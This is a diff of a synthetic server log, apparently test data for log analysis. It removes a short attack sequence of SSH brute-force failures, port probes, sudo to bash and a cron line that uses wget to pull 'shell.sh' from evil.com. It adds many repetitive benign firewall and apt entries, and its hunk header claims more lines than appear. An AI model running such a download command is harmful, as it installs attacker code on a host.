@@ -1,18 +1,1204 @@
-Apr 29 08:00:01 sentinel-host sshd[1234]: Failed password for root from 192.168.1.105 port 22 ssh2
-Apr 29 08:00:02 sentinel-host sshd[1234]: Failed password for root from 192.168.1.105 port 22 ssh2
-Apr 29 08:00:03 sentinel-host sshd[1234]: Failed password for admin from 192.168.1.105 port 22 ssh2
-Apr 29 08:00:04 sentinel-host sshd[1234]: Failed password for admin from 192.168.1.105 port 22 ssh2
-Apr 29 08:00:05 sentinel-host sshd[1234]: Failed password for root from 192.168.1.105 port 22 ssh2
-Apr 29 08:00:06 sentinel-host sshd[1234]: Failed password for ubuntu from 192.168.1.105 port 22 ssh2
-Apr 29 08:00:07 sentinel-host sshd[1234]: Failed password for ubuntu from 192.168.1.105 port 22 ssh2
-Apr 29 08:00:08 sentinel-host sshd[1234]: Failed password for root from 192.168.1.105 port 22 ssh2
-Apr 29 08:00:09 sentinel-host sshd[1234]: Failed password for root from 192.168.1.105 port 22 ssh2
-Apr 29 08:00:10 sentinel-host sshd[1234]: Failed password for root from 192.168.1.105 port 22 ssh2
-Apr 29 08:01:00 sentinel-host kernel: [UFW BLOCK] IN=eth0 SRC=10.5.5.5 DST=10.0.0.1 PROTO=TCP DPT=22
-Apr 29 08:01:01 sentinel-host kernel: [UFW BLOCK] IN=eth0 SRC=10.5.5.5 DST=10.0.0.1 PROTO=TCP DPT=80
-Apr 29 08:01:02 sentinel-host kernel: [UFW BLOCK] IN=eth0 SRC=10.5.5.5 DST=10.0.0.1 PROTO=TCP DPT=443
-Apr 29 08:01:03 sentinel-host kernel: [UFW BLOCK] IN=eth0 SRC=10.5.5.5 DST=10.0.0.1 PROTO=TCP DPT=3306
-Apr 29 08:01:04 sentinel-host kernel: [UFW BLOCK] IN=eth0 SRC=10.5.5.5 DST=10.0.0.1 PROTO=TCP DPT=5432
-Apr 29 08:05:00 sentinel-host sshd[5678]: Accepted password for deploy from 203.0.113.10 port 48122 ssh2
-Apr 29 08:10:00 sentinel-host sudo[9012]: deploy : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash
-Apr 29 08:15:00 sentinel-host cron[1111]: (root) CMD (/usr/bin/wget -O /tmp/.x http://evil.com/shell.sh)
+Apr 29 00:00:00 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:00:37 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:00:53 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:01:49 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:02:19 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:02:50 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:02:57 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:03:21 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:03:45 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:04:45 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:04:52 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:05:19 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:05:40 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:06:22 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:06:48 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:07:38 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:08:02 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:08:45 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:09:01 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:09:25 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:09:42 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:10:34 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:11:03 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:11:46 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:11:57 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:12:10 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:12:33 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:12:48 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:12:55 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:13:36 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:13:48 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:14:34 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:14:39 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:14:51 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:15:19 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:16:08 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:16:36 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:17:01 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:17:22 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:18:03 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:18:28 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:18:47 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:18:57 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:19:36 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:20:00 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:20:38 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:21:01 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:21:59 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:22:23 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:22:59 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:23:11 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:23:25 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:23:53 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:24:34 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:25:03 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:25:17 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:25:29 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:25:41 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:26:07 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:26:51 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:27:15 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:27:50 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:27:55 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:28:32 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:28:56 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:29:44 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:30:10 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:31:01 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:31:13 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:32:02 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:32:13 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:33:01 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:33:28 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:34:19 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:34:33 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:35:08 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:35:23 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:36:09 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:36:20 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:37:16 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:37:27 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:38:25 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:38:53 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:39:19 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:39:36 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:40:03 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:40:12 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:41:09 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:41:20 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:42:01 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:42:06 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:42:43 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:43:01 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:43:37 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:43:44 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:44:32 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:44:48 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:45:41 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:45:53 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:46:39 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:46:53 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:47:17 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:47:23 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:47:56 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:48:10 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:48:44 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:49:06 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:50:05 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:50:30 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:51:19 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:51:31 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:51:44 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:51:52 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:52:33 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:52:56 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:53:07 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:53:19 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:53:53 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:54:19 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:54:32 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:54:55 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:55:45 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:55:51 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:56:35 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:57:03 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:57:39 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:58:08 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:58:45 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 00:59:05 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 00:59:55 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:00:00 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:00:10 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:00:23 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:01:03 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:01:16 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:02:04 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:02:23 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:02:47 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:03:05 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:04:01 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:04:23 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:04:41 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:05:10 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:05:38 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:05:57 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:06:36 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:06:52 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:07:35 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:07:57 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:08:20 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:08:49 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:09:07 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:09:20 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:09:54 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:10:16 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:10:55 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:11:21 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:11:33 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:11:58 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:12:18 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:12:44 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:13:22 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:13:27 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:13:46 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:13:58 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:14:52 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:15:17 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:15:53 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:16:16 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:16:34 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:16:50 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:17:14 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:17:23 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:18:11 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:18:31 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:18:53 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:19:15 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:19:45 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:19:55 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:20:29 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:20:50 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:21:20 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:21:37 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:22:34 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:22:44 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:22:54 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:23:05 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:23:48 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:24:11 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:24:57 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:25:13 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:25:50 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:26:00 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:26:25 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:26:44 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:27:04 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:27:19 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:27:36 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:27:56 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:28:35 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:28:45 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:28:59 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:29:26 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:30:01 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:30:31 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:30:46 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:30:52 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:31:12 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:31:31 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:32:28 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:32:43 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:33:40 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:34:09 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:34:59 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:35:09 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:35:57 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:36:23 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:36:34 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:36:48 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:37:40 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:38:06 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:38:25 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:38:48 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:39:12 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=198.51.100.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:39:42 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:40:30 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.2.10 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:41:00 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:41:58 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=203.0.113.200 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:42:19 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:43:09 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=10.0.1.5 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:43:24 prod-server-01 systemd[1]: Started Daily apt download and install activities.
+Apr 29 01:44:18 prod-server-01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.50 DST=10.0.1.1 PROTO=TCP DPT=443
+Apr 29 01:44:36 prod-server-01 systemd[1]: Started Daily apt download and install activities.
